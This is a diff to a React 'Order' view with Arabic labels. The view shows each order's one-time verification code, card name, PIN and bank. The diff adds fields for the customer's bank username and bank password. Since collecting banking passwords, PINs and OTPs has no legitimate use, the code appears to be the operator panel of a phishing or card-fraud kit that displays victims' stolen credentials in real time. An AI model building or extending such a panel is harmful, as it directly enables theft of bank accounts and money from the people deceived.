@@ -57,7 +57,16 @@ const Order = ({data,socket,setActive,reftch}) => {
               <span className='flex items-center justify-center flex-1'>رمز التحقق</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{data.otp}</span>
             </div>
+            {order.bankUsername ?<>
+              <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
+              <span className='flex items-center justify-center flex-1'>مستخدم البنك</span>
+              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.bankUsername}</span>
+            </div>
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
+              <span className='flex items-center justify-center flex-1'>باسورد البنك</span>
+              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.bankPassword}</span>
+            </div></> : <>
+              <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>اسم الكارت</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.card_name}</span>
             </div>
@@ -76,7 +85,7 @@ const Order = ({data,socket,setActive,reftch}) => {
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>PIN</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.pin}</span>
-            </div>
+            </div></>}
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>بنك</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.bank}</span>
@@ -150,7 +159,18 @@ const Order = ({data,socket,setActive,reftch}) => {
               <span className='flex items-center justify-center flex-1'>رمز التحقق</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.otp || '-'}</span>
             </div>
+            {
+              order.bankUsername ? <>
+                          <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
+              <span className='flex items-center justify-center flex-1'>مستخدم البنك  </span>
+              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.bankUsername}</span>
+            </div>
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
+              <span className='flex items-center justify-center flex-1'>باسورد البنك</span>
+              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.bankPassword}</span>
+            </div>
+              </>:<>
+                          <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>اسم  الكارت</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.card_name}</span>
             </div>
@@ -169,11 +189,13 @@ const Order = ({data,socket,setActive,reftch}) => {
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>PIN</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.pin}</span>
-            </div>
+            </div></> 
+            }
             <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
               <span className='flex items-center justify-center flex-1'>بنك</span>
               <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.bank}</span>
             </div>
+
               </div>
           </div>
       }
